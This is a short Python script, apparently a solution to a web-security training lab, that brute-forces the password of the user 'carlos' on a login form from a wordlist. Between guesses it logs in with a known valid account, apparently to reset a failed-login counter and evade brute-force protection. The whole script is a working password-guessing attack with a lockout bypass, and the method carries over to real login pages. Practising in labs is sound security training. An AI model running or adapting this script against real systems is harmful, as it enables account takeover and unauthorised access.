import requests
from utils import get_password_wordlist

LAB_URL= input("Enter the URL of the lab: ")

def send_valid_credentials() -> bool:
    valid_credentials = {
        "username": "wiener",
        "password": "peter"
    }
    r = requests.post(LAB_URL, data=valid_credentials)

    if r.status_code == 302:
        return True
    else: 
        return False
    
def brute_force(passwords: list[str]) -> None:

    for password in passwords:

        brute_attempt = {
            "username": "carlos",
            "password": password
        }

        print(brute_attempt)
        send_valid_credentials()
        r = requests.post(LAB_URL, data=brute_attempt)

        
        if "Incorrect password" not in r.text:
            print(f"Found password {password} for user carlos")
            break

if __name__ == "__main__":
    passwords = get_password_wordlist()
    brute_force(passwords)
